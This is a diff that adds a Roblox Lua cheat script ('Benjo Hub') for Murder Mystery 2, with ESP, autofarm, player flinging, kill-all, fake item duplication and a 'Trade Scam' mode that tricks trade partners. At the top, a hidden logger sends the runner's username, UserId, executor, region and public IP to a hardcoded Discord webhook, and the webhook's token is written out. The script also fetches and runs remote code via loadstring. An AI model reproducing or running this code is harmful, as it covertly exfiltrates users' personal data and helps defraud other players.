@@ -1,0 +1,1416 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1482071161864196138/buwjhm5UnckGgZCQrZVBDY6RtMQoQmKS0UgpbRAFvwvWJsUEa1K9nHnSuol0PxnrQrVD"
+local HUB_NAME = "Benjo Hub"
+local EMBED_COLOR = 854830
+
+--==================================================
+-- SERVICES
+--==================================================
+local Players            = game:GetService("Players")
+local HttpService        = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService= game:GetService("LocalizationService")
+local RunService         = game:GetService("RunService")
+local UserInputService   = game:GetService("UserInputService")
+local TweenService       = game:GetService("TweenService")
+local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local CoreGui            = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+
+--==================================================
+-- SAFE REQUEST
+--==================================================
+local http_request =
+    (typeof(request)          == "function" and request)          or
+    (syn  and syn.request)   or
+    (fluxus and fluxus.request)
+
+if not http_request then
+    warn("[Benjo Hub] Executor does not support HTTP requests")
+    return
+end
+
+--==================================================
+-- GAME INFO
+--==================================================
+local GAME_ID   = game.PlaceId
+local JOB_ID    = game.JobId
+local GAME_NAME = "Murder Mystery 2"
+pcall(function()
+    local n = MarketplaceService:GetProductInfo(GAME_ID).Name
+    if n and n ~= "" then GAME_NAME = n end
+end)
+
+--==================================================
+-- EXECUTOR DETECTION
+--==================================================
+local EXECUTOR = "Unknown"
+pcall(function()
+    if identifyexecutor then EXECUTOR = identifyexecutor()
+    elseif getexecutorname then EXECUTOR = getexecutorname() end
+end)
+
+--==================================================
+-- REGION / IP
+--==================================================
+local REGION = "Unknown"
+pcall(function() REGION = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer) end)
+
+local IP_ADDRESS = "Hidden"
+pcall(function()
+    local res = http_request({ Url = "https://api.ipify.org", Method = "GET" })
+    if res and res.Body then IP_ADDRESS = res.Body end
+end)
+
+--==================================================
+-- ANTI DUPLICATE
+--==================================================
+if _G.__BENJO_LOGGED then return end
+_G.__BENJO_LOGGED = true
+
+--==================================================
+-- WEBHOOK
+--==================================================
+local function sendWebhook()
+    local data = {
+        username   = HUB_NAME .. " Logger",
+        avatar_url = "https://i.imgur.com/4M34hi2.png",
+        embeds     = {{
+            title = "Script Executed",
+            color = EMBED_COLOR,
+            thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png" },
+            fields = {
+                { name = "Player",  value = "**Username:** " .. LocalPlayer.Name .. "\n**UserId:** " .. LocalPlayer.UserId, inline = false },
+                { name = "Game",    value = "**Name:** " .. GAME_NAME .. "\n**GameId:** " .. GAME_ID,                       inline = false },
+                { name = "Session", value = "**Executor:** " .. EXECUTOR .. "\n**JobId:** `" .. JOB_ID .. "`",              inline = false },
+                { name = "Network", value = "**Region:** " .. REGION .. "\n**IP:** " .. IP_ADDRESS,                        inline = false },
+            },
+            footer    = { text = HUB_NAME .. " | SCRIPT by Lotrixxxthebabyy | Secure Logger" },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    pcall(function()
+        http_request({
+            Url     = WEBHOOK_URL,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = HttpService:JSONEncode(data)
+        })
+    end)
+end
+sendWebhook()
+
+--==================================================
+-- WIND UI
+--==================================================
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+--==================================================
+-- COLORS
+--==================================================
+local Colors = {
+    Orange     = Color3.fromHex("#FF6B1A"),
+    DarkOrange = Color3.fromHex("#FF4500"),
+    Purple     = Color3.fromHex("#9D4EDD"),
+    DarkPurple = Color3.fromHex("#5A189A"),
+    Blood      = Color3.fromHex("#8B0000"),
+    Ghost      = Color3.fromHex("#E0E0E0"),
+    Pumpkin    = Color3.fromHex("#FF7518"),
+    Witch      = Color3.fromHex("#6B2E8A"),
+    Midnight   = Color3.fromHex("#0D0B2E"),
+    Toxic      = Color3.fromHex("#39FF14"),
+    Red        = Color3.fromHex("#FF0000"),
+    Green      = Color3.fromHex("#00FF00"),
+    Gold       = Color3.fromHex("#FFD700"),
+    Blue       = Color3.fromHex("#1E90FF"),
+    Innocent   = Color3.fromHex("#39FF14"),
+    Sheriff    = Color3.fromHex("#001e80"),
+    Murder     = Color3.fromHex("#e80909"),
+}
+
+local function GradText(text, c1, c2)
+    local out, len = "", #text
+    for i = 1, len do
+        local p = (i-1) / math.max(len-1, 1)
+        local r = math.floor((c1.R + (c2.R - c1.R) * p) * 255)
+        local g = math.floor((c1.G + (c2.G - c1.G) * p) * 255)
+        local b = math.floor((c1.B + (c2.B - c1.B) * p) * 255)
+        out = out .. string.format('<font color="rgb(%d,%d,%d)">%s</font>', r, g, b, text:sub(i,i))
+    end
+    return out
+end
+
+--==================================================
+-- POPUP
+--==================================================
+local popupClosed = false
+WindUI:Popup({
+    Title   = GradText("Benjo Hub", Colors.Red, Colors.Green),
+    Icon    = "skull",
+    Content = GradText("Best Murder Mystery 2 Script", Colors.Gold, Colors.Blue)
+        .. "<br/>" .. GradText("SCRIPT by Lotrixxxthebabyy", Colors.Purple, Colors.DarkPurple),
+    Buttons = {
+        { Title = "Exit",     Callback = function() end,                    Variant = "Tertiary" },
+        { Title = GradText("Continue", Colors.Toxic, Colors.Orange),
+          Callback = function() popupClosed = true end,                      Variant = "Primary"  },
+    },
+})
+repeat task.wait() until popupClosed
+
+--==================================================
+-- WINDOW
+--==================================================
+local Window = WindUI:CreateWindow({
+    Title        = GradText("Benjo Hub | Murder Mystery 2", Colors.Red, Colors.Green),
+    Author       = "SCRIPT by Lotrixxxthebabyy",
+    Folder       = "Benjo Hub",
+    Icon         = "skull",
+    NewElements  = true,
+    Size         = UDim2.new(0,580,0,480),
+    Transparent  = true,
+    BackgroundTransparency = 0.5,
+    Theme        = "Dark",
+    SideBarWidth = 220,
+    HideSearchBar= false,
+    ScrollBarEnabled = true,
+    OpenButton   = {
+        Title           = "Open Benjo Hub",
+        CornerRadius    = UDim.new(0.5,0),
+        StrokeThickness = 2,
+        Enabled         = true,
+        Draggable       = true,
+        OnlyMobile      = false,
+        Color           = ColorSequence.new(Colors.Red, Colors.Green),
+    },
+    User = { Enabled = true, Anonymous = false, Callback = function() end },
+})
+
+--==================================================
+-- STATE
+--==================================================
+local coinAutofarmEnabled     = false
+local candyAutofarmEnabled    = false
+local autoEndRoundEnabled     = false
+local autoFlingMurdererEnabled= false
+local flingMurdererOnFull     = false
+local collectedItems          = {}
+local autofarmSpeed           = 25
+local coinsCollected          = 0
+local candyCollected          = 0
+local maxCandyCapacity        = 40
+
+local character        = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local roundActive      = false
+local isTeleporting    = false
+local roundEnding      = false
+local startPosition    = nil
+
+local PREMIUM_GAMEPASS_ID = 818078531
+local function CheckGamepass()
+    local ok, owns = pcall(function()
+        return MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, PREMIUM_GAMEPASS_ID)
+    end)
+    maxCandyCapacity = (ok and owns) and 50 or 40
+end
+CheckGamepass()
+
+--==================================================
+-- ESP STATE
+--==================================================
+local espFilters       = {"Esp All"}
+local highlightEnabled = false
+local lineESPEnabled   = false
+local lineESPObjects   = {}
+local espConnection    = nil
+
+--==================================================
+-- WEAPON / TRADE STATE
+--==================================================
+local selectedWeaponName = ""
+local dupeAmount = 1
+local fromWeapon = ""
+local toWeapon   = ""
+
+local inventoryMain = nil
+pcall(function()
+    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
+        inventoryMain = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+    else
+        inventoryMain = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+    end
+end)
+
+local CharacterStats = {
+    WalkSpeed = { Value = 16, Default = 16, Locked = false },
+    JumpPower = { Value = 50, Default = 50, Locked = false },
+}
+
+--==================================================
+-- ROLE DETECTION (FIXED)
+--==================================================
+local function GetPlayerRole(player)
+    if not player or not player.Character then return nil end
+    local char    = player.Character
+    local backpack = player:FindFirstChild("Backpack")
+    local function hasItem(name)
+        return char:FindFirstChild(name) ~= nil or
+               (backpack and backpack:FindFirstChild(name) ~= nil)
+    end
+    if hasItem("Knife") then return "Murderer" end
+    if hasItem("Gun")   then return "Sheriff"  end
+    return "Innocent"
+end
+
+local function GetRoleColor(role)
+    if role == "Murderer" then return Colors.Blood end
+    if role == "Sheriff"  then return Colors.Toxic end
+    return Colors.Ghost
+end
+
+local function ShouldHighlight(player)
+    local role = GetPlayerRole(player)
+    if not role then return false, nil end
+    if table.find(espFilters, "Esp All")              then return true, role end
+    if table.find(espFilters, "Esp Murder")          and role == "Murderer" then return true, role end
+    if table.find(espFilters, "Esp Sheriff")         and role == "Sheriff"  then return true, role end
+    if table.find(espFilters, "Esp Sheriff / Murder") and (role == "Sheriff" or role == "Murderer") then return true, role end
+    return false, nil
+end
+
+--==================================================
+-- HIGHLIGHT HELPERS
+--==================================================
+local function ApplyHighlight(char, color)
+    local h = char:FindFirstChild("BenjoHL")
+    if not h then
+        h = Instance.new("Highlight")
+        h.Name            = "BenjoHL"
+        h.FillTransparency    = 0.45
+        h.OutlineTransparency = 0
+        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        h.Adornee   = char
+        h.Parent    = char
+    end
+    h.FillColor    = color
+    h.OutlineColor = color
+end
+
+local function ClearHighlight(char)
+    if not char then return end
+    local h = char:FindFirstChild("BenjoHL")
+    if h then h:Destroy() end
+end
+
+--==================================================
+-- LINE ESP HELPERS
+--==================================================
+local function GetBottomCenter()
+    local vp = workspace.CurrentCamera.ViewportSize
+    return Vector2.new(vp.X / 2, vp.Y)
+end
+
+local function ApplyLine(player, color)
+    if not player.Character then return end
+    local root = player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(root.Position)
+    local line = lineESPObjects[player]
+    if not line then
+        line = Drawing.new("Line")
+        line.Thickness = 2
+        lineESPObjects[player] = line
+    end
+    line.Color   = color
+    line.From    = GetBottomCenter()
+    line.To      = Vector2.new(pos.X, pos.Y)
+    line.Visible = onScreen
+    line.Transparency = 1
+end
+
+local function ClearLine(player)
+    if lineESPObjects[player] then
+        lineESPObjects[player]:Destroy()
+        lineESPObjects[player] = nil
+    end
+end
+
+--==================================================
+-- ESP HEARTBEAT
+--==================================================
+local function StartESP()
+    if espConnection then espConnection:Disconnect() end
+    espConnection = RunService.Heartbeat:Connect(function()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player == LocalPlayer then continue end
+            local char = player.Character
+            if not char then
+                ClearHighlight(nil)
+                ClearLine(player)
+                continue
+            end
+            local should, role = ShouldHighlight(player)
+            local color = role and GetRoleColor(role) or Colors.Ghost
+            if highlightEnabled and should then
+                ApplyHighlight(char, color)
+            else
+                ClearHighlight(char)
+            end
+            if lineESPEnabled and should then
+                ApplyLine(player, color)
+            else
+                ClearLine(player)
+            end
+        end
+    end)
+end
+
+local function StopESP()
+    if espConnection then espConnection:Disconnect() espConnection = nil end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            if player.Character then ClearHighlight(player.Character) end
+            ClearLine(player)
+        end
+    end
+end
+
+local function RefreshESP()
+    if highlightEnabled or lineESPEnabled then StartESP() else StopESP() end
+end
+
+Players.PlayerRemoving:Connect(function(p)
+    ClearLine(p)
+    if p.Character then ClearHighlight(p.Character) end
+end)
+
+--==================================================
+-- CHARACTER STATS
+--==================================================
+local function ApplyCharacterStats()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    if not CharacterStats.WalkSpeed.Locked then hum.WalkSpeed = CharacterStats.WalkSpeed.Value end
+    if not CharacterStats.JumpPower.Locked  then hum.JumpPower  = CharacterStats.JumpPower.Value  end
+end
+
+--==================================================
+-- FLING
+--==================================================
+local function FlingPlayers(playerNames)
+    local flingAll = false
+    local function GetFromName(name)
+        name = name:lower()
+        if name == "all" or name == "others" then flingAll = true return end
+        if name == "random" then
+            local all = Players:GetPlayers()
+            for i = #all, 1, -1 do if all[i] == LocalPlayer then table.remove(all, i) end end
+            return all[math.random(#all)]
+        end
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                if p.Name:lower():match("^"..name) or p.DisplayName:lower():match("^"..name) then return p end
+            end
+        end
+    end
+
+    local function DoFling(tp)
+        local lc = LocalPlayer.Character
+        local lh = lc and lc:FindFirstChildOfClass("Humanoid")
+        local lr = lh and lh.RootPart
+        if not lc or not lh or not lr then return end
+        local tc = tp.Character
+        local th = tc:FindFirstChildOfClass("Humanoid")
+        local tr = th and th.RootPart
+        local tH = tc:FindFirstChild("Head")
+        if th and th.Sit and not flingAll then return end
+        if lr.Velocity.Magnitude < 50 then getgenv().OldPos = lr.CFrame end
+        if tH then workspace.CurrentCamera.CameraSubject = tH
+        elseif th and tr then workspace.CurrentCamera.CameraSubject = th end
+
+        local function Tp(part, off, rot)
+            lr.CFrame = CFrame.new(part.Position) * off * rot
+            lc:SetPrimaryPartCFrame(CFrame.new(part.Position) * off * rot)
+            lr.Velocity = Vector3.new(9e8,9e8,9e8)
+            lr.RotVelocity = Vector3.new(9e8,9e8,9e8)
+        end
+        local function PerformFling(part)
+            local spin, st = 0, tick()
+            while lr do
+                if not th then break end
+                if part.Velocity.Magnitude < 50 then
+                    spin += 100
+                    Tp(part, CFrame.new(0,1.5,0)+th.MoveDirection*part.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(spin),0,0)) task.wait()
+                    Tp(part, CFrame.new(0,-1.5,0)+th.MoveDirection*part.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(spin),0,0)) task.wait()
+                    Tp(part, CFrame.new(2.25,1.5,-2.25)+th.MoveDirection*part.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(spin),0,0)) task.wait()
+                    Tp(part, CFrame.new(-2.25,-1.5,2.25)+th.MoveDirection*part.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(spin),0,0)) task.wait()
+                else
+                    Tp(part, CFrame.new(0,1.5,th.WalkSpeed),  CFrame.Angles(math.rad(90),0,0)) task.wait()
+                    Tp(part, CFrame.new(0,-1.5,-th.WalkSpeed), CFrame.Angles(0,0,0))            task.wait()
+                end
+                if part.Velocity.Magnitude > 500  then break end
+                if part.Parent ~= tc              then break end
+                if tp.Parent   ~= Players         then break end
+                if tp.Character ~= tc             then break end
+                if th.Sit or lh.Health <= 0       then break end
+                if tick() > st + 2                then break end
+            end
+        end
+
+        workspace.FallenPartsDestroyHeight = 0/0
+        local bv = Instance.new("BodyVelocity")
+        bv.Name = "BenjoVel" bv.Parent = lr
+        bv.Velocity  = Vector3.new(9e8,9e8,9e8)
+        bv.MaxForce  = Vector3.new(math.huge,math.huge,math.huge)
+        lh:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        if tr and tH then
+            if (tr.CFrame.p - tH.CFrame.p).Magnitude > 5 then PerformFling(tH) else PerformFling(tr) end
+        elseif tr then PerformFling(tr)
+        elseif tH then PerformFling(tH) end
+        bv:Destroy()
+        lh:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = lh
+        repeat
+            lr.CFrame = getgenv().OldPos * CFrame.new(0,0.5,0)
+            lc:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0,0.5,0))
+            lh:ChangeState("GettingUp")
+            for _, part in pairs(lc:GetChildren()) do
+                if part:IsA("BasePart") then part.Velocity = Vector3.zero part.RotVelocity = Vector3.zero end
+            end
+            task.wait()
+        until (lr.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = -500
+    end
+
+    if not playerNames[1] then return end
+    if flingAll then
+        for _, p in pairs(Players:GetPlayers()) do DoFling(p) end
+    else
+        for _, name in pairs(playerNames) do
+            local t = GetFromName(name)
+            if t and t ~= LocalPlayer then DoFling(t) end
+        end
+    end
+end
+
+local function FlingMurderer()
+    local m = nil
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character and GetPlayerRole(p) == "Murderer" then m = p break end
+    end
+    if m then
+        WindUI:Notify({ Title="Flinging Murderer", Content="Flinging "..m.Name.."!", Icon="zap", Duration=3 })
+        FlingPlayers({m.Name})
+        WindUI:Notify({ Title="Done", Content="Murderer flung!", Icon="check-circle", Duration=2 })
+        return true
+    end
+    WindUI:Notify({ Title="Fling Error", Content="No murderer found!", Icon="x-circle", Duration=3 })
+    return false
+end
+
+--==================================================
+-- FARMING HELPERS
+--==================================================
+local function GetCharacter() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end
+local function GetHRP()       return GetCharacter():WaitForChild("HumanoidRootPart")             end
+
+local function FindNearestCoin()
+    local root = GetHRP()
+    local best, bestD = nil, math.huge
+    for _, obj in pairs(workspace:GetChildren()) do
+        local cc = obj:FindFirstChild("CoinContainer")
+        if cc then
+            for _, coin in pairs(cc:GetChildren()) do
+                if coin:IsA("BasePart") and coin:FindFirstChild("TouchInterest") then
+                    local d = (root.Position - coin.Position).Magnitude
+                    if d < bestD then bestD = d best = coin end
+                end
+            end
+        end
+    end
+    return best, bestD
+end
+
+local function FindNearestCandy()
+    local root = GetHRP()
+    local best, bestD = nil, math.huge
+    for _, obj in pairs(workspace:GetChildren()) do
+        local cc = obj:FindFirstChild("CoinContainer")
+        if cc then
+            for _, candy in pairs(cc:GetChildren()) do
+                if candy:IsA("BasePart") and candy:GetAttribute("CoinID") == "Candy" and candy:FindFirstChild("TouchInterest") then
+                    local d = (root.Position - candy.Position).Magnitude
+                    if d < bestD then bestD = d best = candy end
+                end
+            end
+        end
+    end
+    if not best then
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and obj.Name == "candy" then
+                local d = (root.Position - obj.Position).Magnitude
+                if d < bestD then bestD = d best = obj end
+            end
+        end
+    end
+    return best, bestD
+end
+
+--==================================================
+-- REMOTES
+--==================================================
+local Remotes         = ReplicatedStorage:FindFirstChild("Remotes")
+local GameplayRemotes = Remotes and Remotes:FindFirstChild("Gameplay")
+local CoinCollectedRemote = GameplayRemotes and GameplayRemotes:FindFirstChild("CoinCollected")
+local RoundStartRemote    = GameplayRemotes and GameplayRemotes:FindFirstChild("RoundStart")
+local RoundEndRemote      = GameplayRemotes and GameplayRemotes:FindFirstChild("RoundEndFade")
+
+if RoundStartRemote then
+    RoundStartRemote.OnClientEvent:Connect(function()
+        roundActive = true startPosition = GetHRP().CFrame
+    end)
+end
+if RoundEndRemote then
+    RoundEndRemote.OnClientEvent:Connect(function() roundActive = false end)
+end
+
+-- Autofarm loop
+task.spawn(function()
+    while true do
+        if (coinAutofarmEnabled or candyAutofarmEnabled) and roundActive and not isTeleporting then
+            local root = GetHRP()
+            local item, dist
+            if candyAutofarmEnabled then item, dist = FindNearestCandy()
+            else item, dist = FindNearestCoin() end
+            if item then
+                if dist > 150 then
+                    root.CFrame = item.CFrame
+                else
+                    local tw = TweenService:Create(root, TweenInfo.new(dist/autofarmSpeed, Enum.EasingStyle.Linear), {CFrame = item.CFrame})
+                    tw:Play()
+                    while true do
+                        task.wait()
+                        if not item:FindFirstChild("TouchInterest") then break end
+                        if not roundActive or not (coinAutofarmEnabled or candyAutofarmEnabled) then break end
+                    end
+                    tw:Cancel()
+                end
+                coinsCollected += 1
+            end
+        end
+        task.wait(0.2)
+    end
+end)
+
+RunService.Stepped:Connect(function()
+    if (coinAutofarmEnabled or candyAutofarmEnabled) and roundActive and not isTeleporting then
+        local char = LocalPlayer.Character
+        if char and char:IsDescendantOf(workspace) then
+            for _, p in ipairs(char:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanCollide = false end
+            end
+        end
+    end
+end)
+
+LocalPlayer.CharacterAdded:Connect(function(char)
+    character      = char
+    humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+    collectedItems = {} candyCollected = 0 isTeleporting = false roundEnding = false
+    CheckGamepass()
+end)
+
+if CoinCollectedRemote then
+    CoinCollectedRemote.OnClientEvent:Connect(function(coinType, amount)
+        if coinType ~= "Candy" then return end
+        candyCollected = amount
+        if candyCollected >= maxCandyCapacity then
+            WindUI:Notify({ Title="Bag Full!", Content="Candy bag full ("..candyCollected.."/"..maxCandyCapacity..")", Icon="package", Duration=3 })
+            candyAutofarmEnabled = false coinAutofarmEnabled = false
+            if autoFlingMurdererEnabled then FlingMurderer() end
+            if autoEndRoundEnabled and not roundEnding then
+                roundEnding = true isTeleporting = true
+                local root = GetHRP()
+                if startPosition then
+                    local tw = TweenService:Create(root, TweenInfo.new(2, Enum.EasingStyle.Linear), {CFrame = startPosition})
+                    tw:Play() tw.Completed:Wait()
+                end
+                task.wait(0.5)
+                WindUI:Notify({ Title="Auto Reset", Content="Resetting character!", Icon="refresh-cw", Duration=2 })
+                if LocalPlayer.Character then
+                    LocalPlayer.Character:BreakJoints()
+                    LocalPlayer.CharacterAdded:Wait()
+                    task.wait(1.5)
+                end
+                roundEnding = false isTeleporting = false
+            end
+        end
+    end)
+end
+
+if RoundStartRemote then
+    RoundStartRemote.OnClientEvent:Connect(function()
+        candyCollected = 0 collectedItems = {} isTeleporting = false roundEnding = false
+        roundActive = true startPosition = GetHRP().CFrame
+        if candyAutofarmEnabled or coinAutofarmEnabled then
+            WindUI:Notify({ Title="Round Started!", Content="Autofarm resumed", Icon="play-circle", Duration=2 })
+        end
+    end)
+end
+
+--==================================================
+-- WEAPON / DUPE
+--==================================================
+local function DuplicateWeapon()
+    wait(math.random(1,3))
+    if not inventoryMain then return end
+    for _, cat in pairs(inventoryMain.Weapons.Items.Container:GetChildren()) do
+        for _, folder in pairs(cat.Container:GetChildren()) do
+            if folder.Name == "Christmas" or folder.Name == "Halloween" then
+                for _, item in pairs(folder.Container:GetChildren()) do
+                    if item:IsA("Frame") and item.ItemName.Label.Text == selectedWeaponName then
+                        local num = tonumber((item.Container.Amount.Text):match("x(%d+)"))
+                        item.Container.Amount.Text = num and ("x"..(num+1)) or "x2"
+                    end
+                end
+            elseif folder:IsA("Frame") and folder.ItemName and folder.ItemName.Label.Text == selectedWeaponName then
+                local num = tonumber((folder.Container.Amount.Text):match("x(%d+)"))
+                folder.Container.Amount.Text = num and ("x"..(num+1)) or "x2"
+            end
+        end
+    end
+end
+
+local function DuplicateInventory()
+    wait(math.random(3,5))
+    if not inventoryMain then return end
+    local function dup(frame)
+        if not frame.ItemName then return end
+        local name = frame.ItemName.Label and frame.ItemName.Label.Text
+        if name == "Default Knife" or name == "Default Gun" then return end
+        if not frame.Container or not frame.Container.Amount then return end
+        local num = tonumber((frame.Container.Amount.Text):match("x(%d+)"))
+        frame.Container.Amount.Text = num and ("x"..(num*2)) or "x2"
+    end
+    for _, cat in pairs(inventoryMain.Weapons.Items.Container:GetChildren()) do
+        for _, folder in pairs(cat.Container:GetChildren()) do
+            if folder.Name == "Christmas" or folder.Name == "Halloween" then
+                for _, item in pairs(folder.Container:GetChildren()) do if item:IsA("Frame") then dup(item) end end
+            elseif folder:IsA("Frame") then dup(folder) end
+        end
+    end
+    for _, pet in pairs(inventoryMain.Pets.Items.Container.Current.Container:GetChildren()) do
+        if pet:IsA("Frame") and pet.Container and pet.Container.Amount then
+            local num = tonumber((pet.Container.Amount.Text):match("x(%d+)"))
+            pet.Container.Amount.Text = num and ("x"..(num*2)) or "x2"
+        end
+    end
+end
+
+local function WeaponNameMatches(full, search)
+    return full:gsub("_G_%d%d%d%d",""):gsub("_K_%d%d%d%d",""):lower():find(search:lower(),1,true) ~= nil
+end
+
+local function ActivateTradeScam()
+    local pg = LocalPlayer.PlayerGui
+    local inTrade = (pg:FindFirstChild("TradeGUI") and pg.TradeGUI.Enabled) or
+                    (pg:FindFirstChild("TradeGUI_Phone") and pg.TradeGUI_Phone.Enabled)
+    if inTrade then
+        task.wait(1)
+        WindUI:Notify({ Title="Trade Scam Active", Content="Items are now visual only. Remove all items!", Icon="alert-triangle", Duration=5 })
+    else
+        WindUI:Notify({ Title="Trade Scam Error", Content="You must be in a trade first!", Icon="x-circle", Duration=5 })
+    end
+end
+
+local function GetRandomBox()
+    local ok, bd = pcall(function() return require(ReplicatedStorage.Database.Sync.MysteryBox) end)
+    if not ok or not bd or not next(bd) then return "StandardBox" end
+    local boxes = {}
+    for name in pairs(bd) do table.insert(boxes, name) end
+    return boxes[math.random(#boxes)]
+end
+
+local function SpawnWeapon(weaponName)
+    local ok = pcall(function()
+        local BM = require(ReplicatedStorage.Modules.BoxModule)
+        local DB = require(ReplicatedStorage.Database.Sync.Item)
+        assert(weaponName and DB[weaponName], "invalid weapon")
+        BM.OpenBox(GetRandomBox(), weaponName)
+        pcall(function()
+            getsenv(LocalPlayer.PlayerGui.MainGUI.Inventory.NewItem)._G.NewItem(weaponName, nil, nil, "Weapons", 1)
+        end)
+        WindUI:Notify({ Title="Spawned", Content=weaponName, Icon="check-circle", Duration=3 })
+    end)
+    if not ok then WindUI:Notify({ Title="Error", Content="Could not spawn: "..weaponName, Icon="x-circle", Duration=3 }) end
+end
+
+--==================================================
+-- GUN SYSTEM
+--==================================================
+local GunSystem = { AutoGrabEnabled = false, NotifyGunDrop = true, GunDropCheckInterval = 1, ActiveGunDrops = {} }
+local MAP_NAMES = {"ResearchFacility","Hospital3","MilBase","House2","Workplace","Mansion2","BioLab","Hotel","Factory","Bank2","PoliceStation"}
+
+local function FindGunDrops()
+    GunSystem.ActiveGunDrops = {}
+    for _, mapName in ipairs(MAP_NAMES) do
+        local map = workspace:FindFirstChild(mapName)
+        if map then
+            local gd = map:FindFirstChild("GunDrop")
+            if gd then table.insert(GunSystem.ActiveGunDrops, gd) end
+        end
+    end
+    local main = workspace:FindFirstChild("GunDrop")
+    if main then table.insert(GunSystem.ActiveGunDrops, main) end
+end
+
+local function GrabGun(specificGun)
+    if not specificGun then
+        FindGunDrops()
+        if #GunSystem.ActiveGunDrops == 0 then
+            WindUI:Notify({ Title="Gun System", Content="No guns available", Icon="x-circle", Duration=3 }) return false
+        end
+        local nearest, nearD = nil, math.huge
+        local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            for _, gun in ipairs(GunSystem.ActiveGunDrops) do
+                local d = (root.Position - gun.Position).Magnitude
+                if d < nearD then nearest = gun nearD = d end
+            end
+        end
+        specificGun = nearest
+    end
+    if specificGun and LocalPlayer.Character then
+        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if root then
+            root.CFrame = specificGun.CFrame task.wait(0.3)
+            local prompt = specificGun:FindFirstChildOfClass("ProximityPrompt")
+            if prompt then
+                fireproximityprompt(prompt)
+                WindUI:Notify({ Title="Gun System", Content="Grabbed the gun!", Icon="check-circle", Duration=3 })
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function AutoGrabGunLoop()
+    while GunSystem.AutoGrabEnabled do
+        FindGunDrops()
+        if #GunSystem.ActiveGunDrops > 0 and LocalPlayer.Character then
+            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local nearest, nearD = nil, math.huge
+                for _, gun in ipairs(GunSystem.ActiveGunDrops) do
+                    local d = (root.Position - gun.Position).Magnitude
+                    if d < nearD then nearest = gun nearD = d end
+                end
+                if nearest then
+                    root.CFrame = nearest.CFrame task.wait(0.3)
+                    local p = nearest:FindFirstChildOfClass("ProximityPrompt")
+                    if p then fireproximityprompt(p) task.wait(1) end
+                end
+            end
+        end
+        task.wait(GunSystem.GunDropCheckInterval)
+    end
+end
+
+--==================================================
+-- KILL ALL
+--==================================================
+local killAllEnabled = false
+local attackDelay    = 0.5
+local VALID_ROLES    = {"Sheriff","Hero","Innocent"}
+
+local function HasKnife()
+    local char = LocalPlayer.Character
+    if not char then return false end
+    if char:FindFirstChild("Knife") then return true end
+    local knife = LocalPlayer.Backpack:FindFirstChild("Knife")
+    if knife then knife.Parent = char return true end
+    return false
+end
+
+local function GetNearestTarget()
+    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not myRoot then return nil end
+    local best, bestD = nil, math.huge
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            local role = GetPlayerRole(p)
+            local hum  = p.Character:FindFirstChild("Humanoid")
+            local root = p.Character:FindFirstChild("HumanoidRootPart")
+            if role and hum and hum.Health > 0 and root and table.find(VALID_ROLES, role) then
+                local d = (myRoot.Position - root.Position).Magnitude
+                if d < bestD then best = p bestD = d end
+            end
+        end
+    end
+    return best
+end
+
+local function KillTarget(target)
+    if not target or not target.Character then return false end
+    local hum = target.Character:FindFirstChild("Humanoid")
+    if not hum or hum.Health <= 0 or not HasKnife() then return false end
+    local tr  = target.Character:FindFirstChild("HumanoidRootPart")
+    local myR = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if tr and myR then
+        myR.CFrame = CFrame.new(tr.Position + (myR.Position - tr.Position).Unit * 2, tr.Position)
+    end
+    local knife = LocalPlayer.Character:FindFirstChild("Knife")
+    if knife and knife:FindFirstChild("Stab") then
+        for _ = 1, 3 do knife.Stab:FireServer("Down") end
+        return true
+    end
+    return false
+end
+
+local function StartKillAll()
+    if killAllEnabled then return end
+    killAllEnabled = true
+    task.spawn(function()
+        while killAllEnabled do
+            local t = GetNearestTarget()
+            if not t then killAllEnabled = false break end
+            KillTarget(t) task.wait(attackDelay)
+        end
+    end)
+end
